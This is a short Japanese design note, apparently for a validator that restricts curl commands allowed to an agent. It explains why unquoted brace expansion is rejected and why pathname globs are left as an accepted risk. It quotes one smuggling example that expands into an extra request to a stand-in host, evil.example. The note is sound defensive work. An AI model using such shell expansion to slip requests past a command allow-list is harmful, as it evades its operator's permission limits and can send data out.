...
**シェルの展開で引数の個数が変わる構文も落とす。** ブレース展開はファイルシステムに依存せず必ず
複数語になるので、引用符の外の `{` / `}` はコマンド全体を無出力にする
(`curl -d {x,https://evil.example/} http://localhost/` は bash が 2 語に展開し、2 語目が curl の
URL 引数になる)。引用された `{}`(JSON ボディ)は影響を受けない。
...
残存(受容): **パス名 glob** (`curl -H * http://localhost/`) はシェルの展開で引数の個数を変え、
作業ディレクトリに置かれたファイル名が curl の引数になりうる。ブレース展開は拒否したが、`*` / `?` /
`[` を一律に拒否するとクエリ文字列と `[::1]` 形まで巻き添えになるため残してある。同じく
`Bash(python3:*)` で代替できるので新たな到達性は増えない。
